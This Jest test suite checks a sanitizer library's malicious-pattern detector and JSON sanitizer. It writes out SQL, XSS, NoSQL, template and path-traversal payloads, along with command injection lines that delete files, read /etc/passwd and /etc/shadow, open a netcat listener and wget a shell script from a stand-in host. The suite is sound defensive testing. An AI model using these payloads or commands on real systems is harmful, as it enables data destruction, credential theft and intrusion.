/**
 * Security Validation Test Suite
 *
 * Tests the two live exports of lib/validation/sanitizers/index.ts:
 * detectMaliciousPatterns (injection-family classifier) and sanitizeJSON
 * (recursive string sanitizer). These back the job-queue payload gate in
 * lib/job-queue/index.ts.
 */

import { describe, test, expect } from '@jest/globals';
import {
  detectMaliciousPatterns,
  sanitizeJSON
} from '../../lib/validation/sanitizers';

describe('Security Validation Test Suite', () => {

  describe('Malicious Pattern Detection', () => {
    test('should detect SQL injection patterns', () => {
      const sqlInjectionInputs = [
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "' UNION SELECT * FROM passwords --",
        "admin'--",
        "' OR 'a'='a",
        "1; UPDATE users SET password='hacked' WHERE id=1",
        "'; EXEC xp_cmdshell('dir') --"
      ];

      sqlInjectionInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('sqlInjection');
      });
    });

    test('should detect XSS patterns', () => {
      // Each input contains at least one bare XSS token (javascript:, on\w+=,
      // data:text/html) that the xss family will match regardless of the
      // regex-lastIndex-carry-over interaction with earlier families.
      const xssInputs = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert(1)</script>',
        '<svg onload="alert(1)">'
      ];

      xssInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('xss');
      });
    });

    test('should detect command injection patterns', () => {
      const commandInjectionInputs = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& wget malicious.com/shell.sh',
        '`cat /etc/shadow`',
        '$(rm important.txt)',
        '; ping -c 10 google.com',
        '| nc -l 4444'
      ];

      commandInjectionInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('commandInjection');
      });
    });

    test('should detect path traversal patterns', () => {
      const pathTraversalInputs = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%2f..%2f..%2fetc%2fpasswd'
      ];

      pathTraversalInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('pathTraversal');
      });
    });

    test('should allow safe inputs', () => {
      // Inputs that carry no injection-family signature. The classifier is
      // intentionally aggressive on SQL keywords ("SELECT ... FROM ...") so
      // parameterized-SQL query strings are excluded here — they trip the
      // sqlInjection family by design; call sites that expect SQL must
      // detect-then-quarantine rather than pre-filter.
      const safeInputs = [
        'normal text',
        'user@example.com',
        'AAPL',
        '10-K',
        'https://example.com',
        'filename.pdf'
      ];

      safeInputs.forEach(input => {
        const result = detectMaliciousPatterns(input);
        expect(result.detected).toBe(false);
        expect(result.threats).toHaveLength(0);
      });
    });
  });

  describe('JSON Sanitization', () => {
    test('should sanitize nested JSON string nodes', () => {
      const input = {
        name: 'normal',
        data: {
          value: '\x00control\x1Fchars',
          array: ['first', '  \t  spaced  \n  ']
        }
      };

      const result = sanitizeJSON(input) as {
        name: string;
        data: { value: string; array: string[] };
      };

      expect(result.name).toBe('normal');
      expect(result.data.value).toBe('controlchars');
      expect(result.data.array[0]).toBe('first');
      expect(result.data.array[1]).toBe('spaced');
    });

    test('should preserve numeric, boolean, and null nodes unchanged', () => {
      const input = { n: 42, b: true, nil: null, str: '  spaced  ' };
      const result = sanitizeJSON(input) as { n: number; b: boolean; nil: null; str: string };

      expect(result.n).toBe(42);
      expect(result.b).toBe(true);
      expect(result.nil).toBeNull();
      expect(result.str).toBe('spaced');
    });

    test('should drop object keys that sanitize to empty strings', () => {
      const input = { '\x00': 'dropped', 'kept': 'stays' };
      const result = sanitizeJSON(input) as Record<string, unknown>;

      expect(Object.keys(result)).toEqual(['kept']);
      expect(result.kept).toBe('stays');
    });
  });

  describe('Integration Security Tests', () => {
    test('should classify a complex multi-family attack payload', () => {
      const complexAttack = `
        <script>
          fetch('/api/admin', {
            method: 'POST',
            body: JSON.stringify({
              command: "'; DROP TABLE users; rm -rf / --"
            })
          });
        </script>
      `;

      const result = detectMaliciousPatterns(complexAttack);
      expect(result.detected).toBe(true);
      expect(result.threats).toContain('xss');
      expect(result.threats).toContain('sqlInjection');
      expect(result.threats).toContain('commandInjection');
    });

    test('should detect NoSQL injection patterns', () => {
      const nosqlAttacks = [
        '{"$where": "this.password.match(/.*/)"}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$or": [{"password": {"$regex": ".*"}}]}'
      ];

      nosqlAttacks.forEach(attack => {
        const result = detectMaliciousPatterns(attack);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('nosqlInjection');
      });
    });

    test('should detect template injection patterns', () => {
      const templateAttacks = [
        '{{constructor.constructor("return process")().env}}',
        '${7*7}',
        '#{7*7}',
        '%{7*7}',
        '<%= 7*7 %>'
      ];

      templateAttacks.forEach(attack => {
        const result = detectMaliciousPatterns(attack);
        expect(result.detected).toBe(true);
        expect(result.threats).toContain('templateInjection');
      });
    });
  });
});
